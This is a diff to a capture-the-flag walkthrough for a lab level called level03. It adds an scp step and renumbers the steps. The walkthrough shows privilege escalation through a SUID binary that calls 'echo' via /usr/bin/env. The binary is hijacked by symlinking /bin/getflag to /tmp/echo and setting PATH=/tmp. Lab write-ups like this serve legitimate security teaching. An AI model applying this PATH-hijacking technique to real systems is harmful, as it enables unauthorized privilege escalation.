@@ -14,7 +14,15 @@
 
 	This binary is **owned by `flag03`** and **has the SUID bit set**, meaning it runs with `flag03`’s privileges when executed.
 
-2. **Analyze the binary with Ghidra:**
+2. **Transfer the executable file to your host machine:**
+
+	From your host, use `scp` to copy the file:
+
+	```bash
+	scp -P 4242 level03@<vm-ip>:~/level03 .
+	```
+
+3. **Analyze the binary with Ghidra:**
 
 	Using Ghidra you’ll discover the binary runs:
 
@@ -24,7 +32,7 @@
 
 	This means it uses `/usr/bin/env` to find and execute the first `echo` command in your `$PATH`.
 
-3. **Exploit it by creating a link between files**
+4. **Exploit it by creating a link between files**
 
 	Create a directory and a fake `echo` that actually runs `getflag`:
 
@@ -32,13 +40,13 @@
 	ln -s /bin/getflag /tmp/echo
 	```
 
-4. **Set your custom `PATH`**
+5. **Set your custom `PATH`**
 
 	```bash
 	export PATH=/tmp
 	```
 
-5. **Run the vulnerable binary**
+6. **Run the vulnerable binary**
 
 	```bash
 	./level03
